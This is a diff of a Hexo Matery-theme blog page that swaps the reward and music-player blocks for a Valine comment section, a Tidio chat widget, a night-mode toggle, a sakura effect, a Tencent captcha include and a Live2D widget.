-    }
-
-    #reward .reward-link {
-        font-size: 1.4rem;
-        line-height: 38px;
-    }
-
-    #reward .btn-floating:hover {
-        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
-    }
-
-    #rewardModal {
-        width: 320px;
-        height: 350px;
-    }
-
-    #rewardModal .reward-title {
-        margin: 15px auto;
-        padding-bottom: 5px;
-    }
-
-    #rewardModal .modal-content {
-        padding: 10px;
-    }
-
-    #rewardModal .close {
-        position: absolute;
-        right: 15px;
-        top: 15px;
-        color: rgba(0, 0, 0, 0.5);
-        font-size: 1.3rem;
-        line-height: 20px;
-        cursor: pointer;
-    }
-
-    #rewardModal .close:hover {
-        color: #ef5350;
-        transform: scale(1.3);
-        -moz-transform:scale(1.3);
-        -webkit-transform:scale(1.3);
-        -o-transform:scale(1.3);
-    }
-
-    #rewardModal .reward-tabs {
-        margin: 0 auto;
-        width: 210px;
-    }
-
-    .reward-tabs .tabs {
-        height: 38px;
-        margin: 10px auto;
-        padding-left: 0;
-    }
-
-    .reward-content ul {
-        padding-left: 0 !important;
-    }
-
-    .reward-tabs .tabs .tab {
-        height: 38px;
-        line-height: 38px;
-    }
-
-    .reward-tabs .tab a {
-        color: #fff;
-        background-color: #ccc;
-    }
-
-    .reward-tabs .tab a:hover {
-        background-color: #ccc;
-        color: #fff;
-    }
-
-    .reward-tabs .wechat-tab .active {
-        color: #fff !important;
-        background-color: #22AB38 !important;
-    }
-
-    .reward-tabs .alipay-tab .active {
-        color: #fff !important;
-        background-color: #019FE8 !important;
-    }
-
-    .reward-tabs .reward-img {
-        width: 210px;
-        height: 210px;
-    }
-</style>
-
-<div id="reward">
+                <div id="reward">
     <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
 
     <!-- Modal Structure -->
@@ -959,6 +849,275 @@
     
 
     
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
+        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
+        serverURLs: '',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
 
     
 
@@ -1079,9 +1238,12 @@
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
-<!-- 代码语言 -->
 
-<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.js"></script>
+
+
+<!-- 代码语言 -->
 
 
 <!-- 代码块复制 -->
@@ -1091,7 +1253,6 @@
 
 <!-- 代码块收缩 -->
 
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
 
     </div>
@@ -1121,19 +1282,6 @@
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
             headingSelector: 'h2, h3, h4'
-        });
-
-        // modify the toc link href to support Chinese.
-        let i = 0;
-        let tocHeading = 'toc-heading-';
-        $('#toc-content a').each(function () {
-            $(this).attr('href', '#' + tocHeading + (++i));
-        });
-
-        // modify the heading title id to support Chinese.
-        i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
-            $(this).attr('id', tocHeading + (++i));
         });
 
         // Set scroll toc fixed.
@@ -1197,89 +1345,42 @@
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
 
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
-
-    
-    <div class="container row center-align" style="margin-bottom: 0px !important;">
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
                 <span id="year">2019-2024</span>
             
-            <span id="year">2019</span>
             <a href="/about" target="_blank">hybcx</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
             <br>
             
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">861.1k</span>
             
             
             
+                
             
             
-            <span id="busuanzi_container_site_pv">
-                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
-                    class="white-color"></span>&nbsp;次
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
             </span>
             
             
-            <span id="busuanzi_container_site_uv">
-                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
-                    class="white-color"></span>&nbsp;人
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
             </span>
             
             <br>
+
+            <!-- 运行天数提醒. -->
             
             <br>
             
@@ -1426,6 +1527,30 @@ $(function () {
 });
 </script>
 
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
     <!-- 回到顶部按钮 -->
 <div id="backTop" class="top-scroll">
     <a class="btn-floating btn-large waves-effect waves-light" href="#!">
@@ -1440,6 +1565,33 @@ $(function () {
     <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
     <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
     <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
 
     <!-- Baidu Analytics -->
 
@@ -1467,10 +1619,39 @@ $(function () {
     
 
     
+        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
+        <script>
+            $(document).ready(function () {
+                setInterval(change_Tidio, 50);
+                function change_Tidio() {
+                    var tidio=$("#tidio-chat iframe");
+                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
+                        document.getElementById("tidio-chat-iframe").style.right="-15px";
+                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
+                        document.getElementById("tidio-chat-iframe").style.right="-15px";
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
+                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
+                    }
+                }
+            });
+        </script>
+    
 
     
 
-	
+    <!--腾讯兔小巢-->
+    
     
 
     
@@ -1481,6 +1662,6 @@ $(function () {
     <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
 
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 
 </html>
